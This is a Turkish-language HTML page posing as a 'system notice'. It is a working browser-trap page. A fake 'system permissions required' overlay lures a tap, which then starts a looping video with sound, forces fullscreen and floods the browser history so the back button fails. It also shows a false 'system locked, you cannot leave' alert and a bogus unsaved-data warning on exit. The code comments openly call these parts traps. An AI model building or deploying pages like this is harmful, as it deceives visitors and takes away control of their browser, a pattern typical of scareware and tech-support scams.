<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nexus Pro - Sistem Bildirimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            user-select: none;
        }
        body, html {
            width: 100%;
            height: 100%;
            background-color: #000;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: sans-serif;
        }
        video {
            width: 100vw;
            height: 100vh;
            object-fit: cover;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 1;
        }
        /* Başlangıçta tam ekranı tetiklemek için sahte tıklama katmanı */
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            color: #ff0000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }
        #overlay h1 {
            font-size: 24px;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 2px;
        }
        #overlay p {
            font-size: 14px;
            color: #fff;
        }
    </style>
</head>
<body>

    <div id="overlay" onclick="startTrap()">
        <h1>⚠️ SİSTEM İZNLERİ GEREKLİ ⚠️</h1>
        <p>Devam etmek için ekrana herhangi bir yere dokunun.</p>
    </div>

    <video id="myVideo" playsinline loop src="SnapTik.Net_7627468591947926792.mp4"></video>

    <script>
        // 1. GERİ TUŞU TUZAĞI (History API Trap)
        function lockHistory() {
            for (let i = 0; i < 20; i++) {
                window.history.pushState(null, "", window.location.href);
            }
        }

        window.onpopstate = function() {
            window.history.pushState(null, "", window.location.href);
            alert("⚠️ SİSTEM KİLİTLENDİ! BU SAYFADAN AYRILAMAZSINIZ!");
        };

        // 2. SAYFADAN AYRILMA / KAPATMA UYARISI
        window.onbeforeunload = function() {
            return "Sistemde kaydedilmemiş veriler var. Ayrılmak istediğinize emin misiniz?";
        };

        // 3. BAŞLATMA FONKSİYONU (Sesi açar, tam ekran yapar ve döngüyü başlatır)
        function startTrap() {
            const overlay = document.getElementById("overlay");
            const video = document.getElementById("myVideo");

            // Katmanı kaldır
            overlay.style.display = "none";

            // Videoyu sesli başlat
            video.muted = false;
            video.play();

            // Tam ekran moduna zorla (Mobil cihazlar için)
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen();
            } else if (document.documentElement.webkitRequestFullscreen) { /* Safari / Chrome mobile */
                document.documentElement.webkitRequestFullscreen();
            }

            // Geri tuşu kilidini aktif et
            lockHistory();
        }

        // Sayfa yüklendiğinde geçmişi doldur
        window.onload = function() {
            lockHistory();
        };
    </script>
</body>
</html>
